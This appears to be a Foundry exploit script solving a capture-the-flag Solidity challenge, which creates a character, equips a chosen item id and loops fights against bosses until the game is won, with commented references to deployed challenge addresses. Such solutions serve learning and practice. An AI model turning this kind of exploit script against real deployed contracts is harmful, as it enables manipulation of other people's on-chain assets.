// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.28;

import {Script, console} from "forge-std/Script.sol";
import {Setup} from "../src/Setup.sol";
import {Chal} from "../src/Chal.sol";

contract ExploitScript is Script {
    Chal public chal;
    Chal.Character public player;
    Chal.Character public boss;
    Chal.Item public item;

    function setUp() public {}

    function logPlayer() internal {
        (player.health, player.attack, player.defense, item) = chal.playerCharacter();
        console.log("Player health: ", player.health);
        console.log("Player attack: ", player.attack);
        console.log("Player defense: ", player.defense);
        console.log("Item attack bonus: ", item.attackBonus);
        console.log("Item defense bonus: ", item.defenseBonus);
    }

    function logBoss() internal {
        // (boss.health, boss.attack, boss.defense, item) = chal.bosses(chal.getPlayerLevel() - 1);
        (boss.health, boss.attack, boss.defense, item) = chal.bosses(4);
        console.log("Boss health: ", boss.health);
        console.log("Boss attack: ", boss.attack);
        console.log("Boss defense: ", boss.defense);
        console.log("Boss item attack bonus: ", item.attackBonus);
        console.log("Boss item defense bonus: ", item.defenseBonus);
    }

    function toUint8(uint256 n) internal pure returns (uint8 result) {
        assembly {
            result := n
        }
    }

    function toUint16(uint256 n) internal pure returns (uint16 result) {
        assembly {
            result := n
        }
    }

    function run() public {
        vm.startBroadcast();
        // setup contract: 0xa7a05B6D15aB9f76536A451D7DB5CD16B35d0c64
        // console.log("Exploit script running");
        // chal = Setup(0x7BCd80Bf5Ecc9D28A10585Ea077664aE7c051506).TARGET();
        chal = new Chal();
        chal.createCharacter();
        
        uint16 itemid = 0x4f2;
        chal.getItem(itemid);
        chal.equipItem(itemid);
        console.log("Player level: ", chal.getPlayerLevel());
        (uint16 attack, uint16 defense) = chal.items(itemid);
        console.log("Item: ", attack, defense);

        for (uint256 i = 0; i < 0x100; i++) {
            // console.log(chal.fight());
            if (chal.hasWon()) {
                break;
            }
            chal.fight();
        }

        console.log("Player level: ", chal.getPlayerLevel());

        vm.stopBroadcast();
    }
}
